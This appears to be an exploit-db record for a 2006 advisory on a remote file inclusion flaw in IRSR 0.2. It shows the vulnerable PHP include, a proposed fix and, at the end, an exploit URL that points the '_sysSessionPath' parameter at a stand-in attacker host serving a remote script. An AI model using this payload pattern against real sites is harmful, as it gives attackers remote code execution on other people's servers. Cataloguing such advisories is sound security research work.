{
  "id": "2199",
  "title": "IRSR 0.2 - &#039;_sysSessionPath&#039; Remote File Inclusion",
  "cve": "CVE-2006-4237",
  "vuln_type": "rce",
  "code": "/*\r\n+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n+\r\n-   - - [DEVIL TEAM THE BEST POLISH TEAM] - -\r\n+\r\n+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n+\r\n- IRSR - Invisionix Roaming System Remote <= 0.2 [_sysSessionPath] Remote File Include Vulnerabilities\r\n+\r\n+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n+\r\n- [Script name: IRSR - Invisionix Roaming System Remote v. 0.2\r\n- [Script site: http://www.invisionix.org or http://sourceforge.net/projects/irsr\r\n+\r\n+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n+\r\n-          Find by: Kacper (a.k.a Rahim)\r\n+\r\n-          Contact: kacper1964@yahoo.pl\r\n-                        or\r\n-          http://www.devilteam.yum.pl/\r\n-                       and\r\n-           http://www.rahim.webd.pl/\r\n+\r\n+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n+\r\n- Special Greetz: DragonHeart :-)\r\n- Ema: Leito, Adam, DeathSpeed, Drzewko, pepi\r\n+\r\n- P.S: Pozdrawiam ludzi z United Crew!\r\n+\r\n+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n+\r\n-            Z Dedykacja dla osoby,\r\n-         bez ktorej nie mogl bym zyc...\r\n-           K.C:* J.M (a.k.a Magaja)\r\n+\r\n+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n*/\r\n/*\r\nvulnerable code => pageheaderdefault.inc.php line 28-36:\r\n[code]\r\n//\r\n// Perform the session handling preprocessing.\r\n//\r\nrequire_once    ($_sysSessionPath);    // Include the session handling functions.\r\n\r\nmysql_connect($_sysDBhost1,$_sysDBuser1Login,$_sysDBuser1LoginPass) or die(\"Could NOT obtain authentication info after login!\r\n\");\r\nmysql_select_db($_sysDBname) or die(\"Was NOT able to obtain authentication info after login!\r\n\");\r\n$dblink=@mysql_connect($_sysDBhost1,$_sysDBuser1Login,$_sysDBuser1LoginPass);\r\n$session=updateSession($dblink,$session);    // Should the user have access to this page?\r\n[/code]\r\n+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\nFix:\r\n[code]\r\n$_sysSessionPath = @dirname(@dirname(@dirname(__FILE__)));\r\nrequire_once    ($_sysSessionPath);    // Include the session handling functions.\r\n\r\nmysql_connect($_sysDBhost1,$_sysDBuser1Login,$_sysDBuser1LoginPass) or die(\"Could NOT obtain authentication info after login!\");\r\nmysql_select_db($_sysDBname) or die(\"Was NOT able to obtain authentication info after login!\");\r\n$dblink=@mysql_connect($_sysDBhost1,$_sysDBuser1Login,$_sysDBuser1LoginPass);\r\n$session=updateSession($dblink,$session);    // Should the user have access to this page?\r\n[/code]\r\n+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n*/\r\n#Exploit:\r\n\r\nhttp://www.site.com/[IRSR_path]/system/includes/pageheaderdefault.inc.php?_sysSessionPath=[http://www.myevilsite.com/evil_scripts.txt]\r\n\r\n# milw0rm.com [2006-08-17]",
  "url": "https://www.exploit-db.com/exploits/2199"
}